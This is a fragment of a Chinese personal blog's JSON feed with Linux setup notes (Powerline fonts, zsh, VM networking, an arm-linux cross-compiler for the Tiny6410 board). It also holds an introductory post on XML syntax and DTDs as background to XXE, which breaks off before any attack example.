bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">wget</span> https://raw.githubusercontent.com/powerline/powerline/develop/font/10-powerline-symbols.conf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">wget</span> https://raw.githubusercontent.com/powerline/powerline/develop/font/PowerlineSymbols.otf</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> /usr/share/fonts/OTF</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cp</span> <span class=\"token number\">10</span>-powerline-symbols.conf /usr/share/fonts/OTF/</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mv</span> <span class=\"token number\">10</span>-powerline-symbols.conf /etc/fonts/conf.d/</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mv</span> PowerlineSymbols.otf /usr/share/fonts/OTF/</pre></td></tr></tbody></table></figure><h1 id=\"切换shell为zsh\"><a class=\"anchor\" href=\"#切换shell为zsh\">#</a> 切换 Shell 为 zsh</h1>\n<p>查看系统已安装 shell</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /etc/shells</pre></td></tr></tbody></table></figure><p>永久切换 shell</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> chsh <span class=\"token parameter variable\">-s</span> /bin/zsh</pre></td></tr></tbody></table></figure><p>查看当前 shell</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token environment constant\">$SHELL</span></pre></td></tr></tbody></table></figure>",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/f2a742a4/",
            "url": "http://dpm12345.cn/posts/f2a742a4/",
            "title": "虚拟机网络问题",
            "date_published": "2023-07-19T06:07:26.000Z",
            "content_html": "<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ifconfig</span> <span class=\"token parameter variable\">-a</span> 查看所有网络设备</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">ifconfig</span> ens33 up 开启指定网卡</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> dhclient ens33 自动分配ip地址</pre></td></tr></tbody></table></figure>",
            "tags": [
                "linux"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/3ee262c0/",
            "url": "http://dpm12345.cn/posts/3ee262c0/",
            "title": "xiaodiSec",
            "date_published": "2023-07-08T02:46:12.000Z",
            "content_html": "<h1 id=\"第一天-基础入门-概念名词\"><a class=\"anchor\" href=\"#第一天-基础入门-概念名词\">#</a> 第一天 基础入门 - 概念名词</h1>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d4e86cbd/",
            "url": "http://dpm12345.cn/posts/d4e86cbd/",
            "title": "ubuntu下arm-linux编译环境的搭建",
            "date_published": "2023-07-02T06:00:33.000Z",
            "content_html": "<p>这学期的一门《嵌入式系统课程设计》, 需要进行交叉编译，由于依托于实验室的环境，且实验室的计算机系统为 windows，编译需在虚拟机进行，但少些文件又在 windows 系统下进行</p>\n<p>由于以上带来的不便，便突发奇想在自己电脑上配置环境，使编写、编译、烧写均在一个系统上，提高效率</p>\n<h1 id=\"环境\"><a class=\"anchor\" href=\"#环境\">#</a> 环境</h1>\n<p>Ubuntu16.04LTS (一开始使用的为 Ubuntu22，但由于烧写程序 Minitools 需要 QT4，而且不管怎么找解决方法也解决不了，最终还是换了系统解决的)</p>\n<h1 id=\"所需文件\"><a class=\"anchor\" href=\"#所需文件\">#</a> 所需文件</h1>\n<h2 id=\"arm-linux-gcc交叉编译器安装包\"><a class=\"anchor\" href=\"#arm-linux-gcc交叉编译器安装包\">#</a> arm-linux-gcc 交叉编译器安装包</h2>\n<p>由于使用的是 64 位系统，故安装 64 位的编译器</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMU9TNTNfVWhyQUtQQTY5Mkl3a3NhcVE=\">https://pan.baidu.com/s/1OS53_UhrAKPA692IwksaqQ</span><br>\n 提取码：2vft</p>\n<h2 id=\"minitools\"><a class=\"anchor\" href=\"#minitools\">#</a> MiniTools</h2>\n<p>为烧写程序，为方便操作，这里直接下载 Linux 版，该文件在<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJpZW5kbHllbGVjLmNvbS8=\"> FriendlyElec 官网</span>上有</p>\n<p>点击搜索框下的 <code>DOWNLOADS</code> --&gt; 下拉选择 <code>Tiny6410</code>  --&gt; 选择下载渠道 (这里我选择 OneDrive，网盘限速，但用这个需要点魔法) --&gt; 点击 <code>FriendlyARM-Tiny6410-DVD-A</code> --&gt; 点击 <code>tools</code> --&gt; 下载 <code>MiniTools-Linux-20150528.tgz</code></p>\n<p>(这里不选择 windows 的又一个原因为，windows10 安装时会提示驱动安装失败，需手动安装，而这个安装要将强制数字签名关闭，显得麻烦且不安全)</p>\n<p><img data-src=\"../post_images/tiny6410_1.png\" alt=\"\"></p>\n<h2 id=\"superboot-6410bin\"><a class=\"anchor\" href=\"#superboot-6410bin\">#</a> Superboot-6410.bin</h2>\n<p>烧写程序所需的文件，同样可在上面提到的官网上找到</p>\n<p>前面同上面，路径为 <code>Tiny6410/FriendlyARM-Tiny6410-DVD-B/images/Superboot-6410.bin</code></p>\n<p><img data-src=\"../post_images/tiny6410_4.png\" alt=\"\"></p>\n<h1 id=\"开始安装arm-linux-gcc\"><a class=\"anchor\" href=\"#开始安装arm-linux-gcc\">#</a> 开始安装 arm-linux-gcc</h1>\n<ol>\n<li>\n<p>把下载好的安装包移动到根目录下的 tmp 目录中（/tmp）</p>\n</li>\n<li>\n<p>使用 tar 命令解压安装包，即在 Terminal 中输入以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xjvf</span> /tmp/arm-linux-gcc-4.6.4-arm-x86_64.tar.bz2 <span class=\"token parameter variable\">-C</span> /</pre></td></tr></tbody></table></figure><p>注意是大写的字母【C】，此命令会把安装包解压到根目录下的【opt】的【TuxamitoSoftToolchains】文件夹中（/opt/TuxamitoSoftToolchains）</p>\n</li>\n<li>\n<p>解压完成后，再在（/usr/local）中创建一个新目录【arm】，并授权：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> /usr/local/arm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">chmod</span> <span class=\"token number\">777</span> /usr/local/arm</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>在路径 <code>/opt/TuxamitoSoftToolchains/arm-arm1176jzfssf-linux-gnueabi/</code>  下找到 <code>gcc-4.6.4</code> , 将其复制到前面创建 arm 文件夹中</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cp</span> <span class=\"token parameter variable\">-r</span> /opt/TuxamitoSoftToolchains/arm-arm1176jzfssf-linux-gnueabi/gcc-4.6.4 /usr/local/arm</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>打开（/etc/profile）配置环境变量和库变量，目的是以后可以在任何位置使用该交叉编译器</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/profile</pre></td></tr></tbody></table></figure><p>在文件最后添加两行，并输入以下代码：第一行是添加执行程序的环境变量，第二行是库文件的路径。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span>:/usr/local/arm/gcc-4.6.4/bin</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">LD_LIBRARY_PATH</span><span class=\"token operator\">=</span><span class=\"token variable\">$LD_LIBRARY_PATH</span>:/usr/local/arm/gcc-4.6.4/lib</pre></td></tr></tbody></table></figure><p>保存并退出</p>\n</li>\n<li>\n<p>使用 source 命令重新加载生效该配置文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> /etc/profile</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>检验是否安装成功，在 Terminal 输入以下命令输出版本信息：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>arm-linux-gcc <span class=\"token parameter variable\">-v</span></pre></td></tr></tbody></table></figure><p>若无报错，则安装成功</p>\n<p><img data-src=\"../post_images/tiny6410_2.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"使用minitools\"><a class=\"anchor\" href=\"#使用minitools\">#</a> 使用 Minitools</h1>\n<ol>\n<li>\n<p>将 Minitools 复制到 ubuntu 中</p>\n<p>解压</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xzvf</span> MiniTools-Linux-20150528.tgz</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>进入解压后的文件夹 <code>MiniTools-20150528</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> MiniTools-20150528</pre></td></tr></tbody></table></figure></li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zdGFydC10ajRvMTQzYi5zaA==\">运行 start.sh</span>, 之后会自动选择合适版本启动，要想关闭，直接在终端 <code>Ctrl+C</code>  即可</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>./start.sh</pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/tiny6410_3.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"补充\"><a class=\"anchor\" href=\"#补充\">#</a> 补充</h1>\n<p>在 FriendlyElec 官网 https://www.friendlyelec.com/，有比较多的资料可以找到</p>\n<p>如 <code>FriendlyARM-Tiny6410-DVD-A</code>  下的各种开发文档</p>\n<p><img data-src=\"../post_images/tiny6410_5.png\" alt=\"\"></p>\n<p><code>FriendlyARM-Tiny6410-DVD-A/裸机程序</code> 下的所有文件，与实验报告的文件类似，并有相关的 pdf 文件开发指南，能解决一定疑问</p>\n<p><img data-src=\"../post_images/tiny6410_7.png\" alt=\"\"></p>\n",
            "tags": [
                "arm-linux",
                "Tiny6410"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/6882c75c/",
            "url": "http://dpm12345.cn/posts/6882c75c/",
            "title": "JavaScript 原型链污染(Prototype).md",
            "date_published": "2023-06-15T12:15:40.000Z",
            "content_html": "<h2 id=\"简单了解xxe\"><a class=\"anchor\" href=\"#简单了解xxe\">#</a> 简单了解 XXE</h2>\n<ul>\n<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>\n<li>XML 是一种标记语言，很类似 HTML</li>\n<li>XML 被设计为传输和存储数据，其焦点是数据的内容</li>\n<li>XML 被设计用来结构化、存储以及传输信息</li>\n<li>XML 允许创作者定义自己的标签和自己的文档结构</li>\n</ul>\n<h2 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h2>\n<pre><code>* 注释与HTML相似,为 &lt;!-- 和 --&gt;\n* 大小写敏感\n* 必须有，且只能有一个根元素(如上，根元素即为 students)\n\n</code></pre>\n<h2 id=\"结构\"><a class=\"anchor\" href=\"#结构\">#</a> 结构</h2>\n<pre><code>XML 文档声明，在文档的第一行\nXML 文档类型定义，即DTD，XXE 漏洞所在的地方\nXML 文档元素\n</code></pre>\n<h2 id=\"xml文档\"><a class=\"anchor\" href=\"#xml文档\">#</a> XML 文档</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?&gt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">&lt;!-- 第一行是 XML 声明 --&gt;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">&lt;!-- 这是 XML 处理指令的例子。处理指令以 &amp; lt;? 开始，以？&gt; 结束 --&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">&lt;!-- 在 &amp; lt;? 后的第一个单词是处理指令名，在本例中是 xml--&gt;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">&lt;!-- 处理指令一定要顶格写，前面不能有任何空白 --&gt;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>students</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>GREETING</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token comment\">&lt;!-- 开始标记 --&gt;</span> Hello World <span class=\"token comment\">&lt;!-- 元素内容 --&gt;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>GREETING</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token comment\">&lt;!-- 结束标记 --&gt;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>student</span> <span class=\"token attr-name\">gender</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>male<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">isHandsome</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>true<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>id</span><span class=\"token punctuation\">&gt;</span></span>001<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>id</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>name</span><span class=\"token punctuation\">&gt;</span></span>zhangsan<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>name</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>address</span><span class=\"token punctuation\">&gt;</span></span>Beijing<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>address</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>score</span><span class=\"token punctuation\">&gt;</span></span>50<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>score</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>student</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>student</span> <span class=\"token attr-name\">gender</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>female<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>id</span><span class=\"token punctuation\">&gt;</span></span>002<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>id</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>name</span><span class=\"token punctuation\">&gt;</span></span>lisi<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>name</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>address</span><span class=\"token punctuation\">&gt;</span></span>北京<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>address</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>score</span> <span class=\"token punctuation\">/&gt;</span></span><span class=\"token comment\">&lt;!-- 为空的简写形式 --&gt;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>student</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>students</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><h3 id=\"文档说明\"><a class=\"anchor\" href=\"#文档说明\">#</a> 文档说明</h3>\n<p>每一个 XML 文档都以一个 XML 声明开始，用以指明所用的 XML 的版本。</p>\n<p>XML 声明有 version 、encoding 和 standalone 特性。</p>\n<ul>\n<li>\n<p>version 特性表明这个文档符合 XML 1.0 规范。</p>\n</li>\n<li>\n<p>encoding 属性指定了编码格式，默认情况下是<strong> utf-8</strong>，这个属性要放在属性前面。</p>\n</li>\n<li>\n<p>像 standalone 是 XML 文档的属性，位于等号左边的是特姓名，而其值位于等号的右边，并用<strong>双引号或单引号</strong>括起来。</p>\n</li>\n</ul>\n<p>自定义的元素也可以有一个或多个属性，其属性值使用单引号或者双引号括起来</p>\n<p>属性的形式为：** 属性名 = \"属性值\"，** 比如  <code>gender=\"male\"</code></p>\n<p>多个属性值之间用空格隔开（一个或多个空格都可以）</p>\n<p>在一个元素上，相同的属性只能出现一次</p>\n<p>属性值不能包含 <code>&lt;</code> ,  <code>&gt;</code> ,  <code>&amp;</code></p>\n<h3 id=\"实体\"><a class=\"anchor\" href=\"#实体\">#</a> 实体</h3>\n<p>实体叫 ENTITY，实体的作用是避免重复输入。在 XML 中，有 5 个预定义的实体引用</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">实体</th>\n<th style=\"text-align:center\">符号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><code>&amp;it;</code></td>\n<td style=\"text-align:center\">&lt;</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>&amp;gt;</code></td>\n<td style=\"text-align:center\">&gt;</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>&amp;amp;</code></td>\n<td style=\"text-align:center\">&amp;</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>&amp;quot;</code></td>\n<td style=\"text-align:center\">\"</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>&amp;apos;</code></td>\n<td style=\"text-align:center\">'</td>\n</tr>\n</tbody>\n</table>\n<p><strong>自定义实体语法：</strong></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">根元素</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">实体名</span> <span class=\"token attr-name\">\"实体内容\"</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></pre></td></tr></tbody></table></figure><h3 id=\"处理指令pi\"><a class=\"anchor\" href=\"#处理指令pi\">#</a> 处理指令 PI</h3>\n<p><strong>处理指令</strong>用于 XML 解析器传递信息到应用程序。</p>\n<p>语法： <code>&lt;?目标 指令?&gt;</code></p>\n<p>PI 必须以一个叫做目标的标识符开头，这个标识符遵从如同元素和属性一样的规则，<strong>目标</strong>是指令所指向的应用的名称，<strong>指令</strong>是传递给应用程序的信息。</p>\n<h3 id=\"cdata节\"><a class=\"anchor\" href=\"#cdata节\">#</a> CDATA 节</h3>\n<p>用于把整段文本解释为纯字符数据而不是标记的情况。</p>\n<p>包含大量的 &lt;、&gt;、&amp;、或者 \" 字符。CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 XML 标记。</p>\n<p>可以放置除 <code>]]&gt;</code>  外的任何字符，不能嵌套</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token cdata\">&lt;![CDATA[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>......</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>]]&gt;</pre></td></tr></tbody></table></figure><h3 id=\"pcdata节\"><a class=\"anchor\" href=\"#pcdata节\">#</a> PCDATA 节</h3>\n<p><code>PCDATA</code>  表示已解析的字符数据。</p>\n<p><code>PCDATA</code>  的意思是被解析的字符数据 <code>（parsed character data）</code> 。可以把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。 <code>PCDATA</code>  是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。但是，被解析的字符数据不应当包含任何 <code>&amp; &lt; &gt;</code>  字符；需要使用 <code>&amp; &lt; &gt;</code>  实体来分别替换它们。</p>\n<h2 id=\"dtd\"><a class=\"anchor\" href=\"#dtd\">#</a> DTD</h2>\n<p><code>XXE漏洞存在的地方</code></p>\n<h3 id=\"三种应用形式\"><a class=\"anchor\" href=\"#三种应用形式\">#</a> 三种应用形式</h3>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>1.内部DTD文档</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">根元素</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">定义内容</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>2.外部DTD文档</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">根元素</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"DTD文件路径\"</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>3.内外部DTD文档结合</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">根元素</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"DTD文件路径\"</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">定义内容</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>如</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?&gt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">note</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">note</span> <span class=\"token attr-name\">(to,from,heading,body)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">to</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">from</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">heading</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">body</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>note</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>to</span><span class=\"token punctuation\">&gt;</span></span>Tove<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>to</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>from</span><span class=\"token punctuation\">&gt;</span></span>Jani<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>from</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>heading</span><span class=\"token punctuation\">&gt;</span></span>Reminder<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>heading</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>Don't forget me this weekend<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>note</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>在这里，以下有点类似于类型说明，</p>\n<figure class=\"highlight 